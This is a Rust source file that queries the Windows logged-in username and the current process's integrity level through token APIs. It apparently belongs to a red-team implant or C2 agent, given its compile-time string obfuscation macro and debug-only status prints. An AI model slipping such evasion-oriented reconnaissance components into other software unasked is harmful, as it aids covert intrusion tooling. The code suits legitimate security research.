use std::{ffi::c_void, fmt::Display, mem::transmute, ptr::null_mut};

use serde::Serialize;
use shared::pretty_print::print_failed;
use str_crypter::{decrypt_string, sc};
use windows_sys::{
    Win32::{
        Foundation::{GetLastError, HANDLE},
        NetworkManagement::NetManagement::UNLEN,
        Security::{
            GetSidSubAuthority, GetSidSubAuthorityCount, GetTokenInformation,
            TOKEN_MANDATORY_LABEL, TOKEN_QUERY, TokenIntegrityLevel,
        },
        System::{
            SystemServices::{
                SECURITY_MANDATORY_HIGH_RID, SECURITY_MANDATORY_LOW_RID,
                SECURITY_MANDATORY_MEDIUM_RID, SECURITY_MANDATORY_SYSTEM_RID,
                SECURITY_MANDATORY_UNTRUSTED_RID,
            },
            Threading::{GetCurrentProcess, OpenProcessToken},
            WindowsProgramming::GetUserNameW,
        },
    },
    core::PWSTR,
};

pub fn get_logged_in_username() -> Option<impl Serialize> {
    let buf = [0u16; UNLEN as usize];
    let mut len: u32 = UNLEN;
    let result = unsafe { GetUserNameW(PWSTR::from(buf.as_ptr() as *mut _), &mut len) };

    if result == 0 {
        #[cfg(debug_assertions)]
        println!("[-] Could not get logged in user details. {}", unsafe {
            GetLastError()
        });

        return None;
    }

    // Use the returned count of TCHARS (num chars not bytes) -1 for the null to get a String of the
    // username
    let un = if result == 0 || len == 0 {
        sc!("UNKNOWN", 75).unwrap()
    } else {
        String::from_utf16_lossy(&buf[0..len as usize - 1])
    };

    Some(un)
}

pub enum ProcessIntegrityLevel {
    Unknown,
    Untrusted,
    Low,
    Medium,
    High,
    System,
}

impl Display for ProcessIntegrityLevel {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ProcessIntegrityLevel::Untrusted => write!(f, "untrusted"),
            ProcessIntegrityLevel::Low => write!(f, "low"),
            ProcessIntegrityLevel::Medium => write!(f, "medium"),
            ProcessIntegrityLevel::High => write!(f, "high"),
            ProcessIntegrityLevel::System => write!(f, "system"),
            ProcessIntegrityLevel::Unknown => write!(f, "unknown"),
        }
    }
}

pub fn get_process_integrity_level() -> Option<ProcessIntegrityLevel> {
    let mut token_handle: HANDLE = HANDLE::default();

    if unsafe { OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token_handle) } == 0 {
        #[cfg(debug_assertions)]
        print_failed(format!("Failed to open process token. {:#X}", unsafe {
            GetLastError()
        }));

        return None;
    }

    let mut sz = 0;

    // purposefully fails
    let _ =
        unsafe { GetTokenInformation(token_handle, TokenIntegrityLevel, null_mut(), 0, &mut sz) };

    let buffer: Vec<u8> = Vec::with_capacity(sz as _);

    if unsafe {
        GetTokenInformation(
            token_handle,
            TokenIntegrityLevel,
            buffer.as_ptr() as *mut c_void,
            sz,
            &mut sz,
        )
    } == 0
    {
        #[cfg(debug_assertions)]
        print_failed(format!("Failed to GetTokenInformation2. {:#X}", unsafe {
            GetLastError()
        }));

        return None;
    };

    let token = unsafe { *transmute::<*const u8, *const TOKEN_MANDATORY_LABEL>(buffer.as_ptr()) };

    let count = unsafe { *GetSidSubAuthorityCount(token.Label.Sid) } as u32;
    let rid = unsafe { *GetSidSubAuthority(token.Label.Sid, count - 1) };

    if rid > i32::MAX as u32 {
        #[cfg(debug_assertions)]
        print_failed(format!(
            "RID was greater than i32 max, refusing to convert. Got: {rid}"
        ));

        return None;
    }

    match rid as i32 {
        SECURITY_MANDATORY_UNTRUSTED_RID => Some(ProcessIntegrityLevel::Untrusted),
        SECURITY_MANDATORY_LOW_RID => Some(ProcessIntegrityLevel::Low),
        SECURITY_MANDATORY_MEDIUM_RID => Some(ProcessIntegrityLevel::Medium),
        SECURITY_MANDATORY_HIGH_RID => Some(ProcessIntegrityLevel::High),
        SECURITY_MANDATORY_SYSTEM_RID => Some(ProcessIntegrityLevel::System),
        _ => {
            #[cfg(debug_assertions)]
            print_failed(format!("Could not match RID. Got: {rid}"));

            None
        }
    }
}
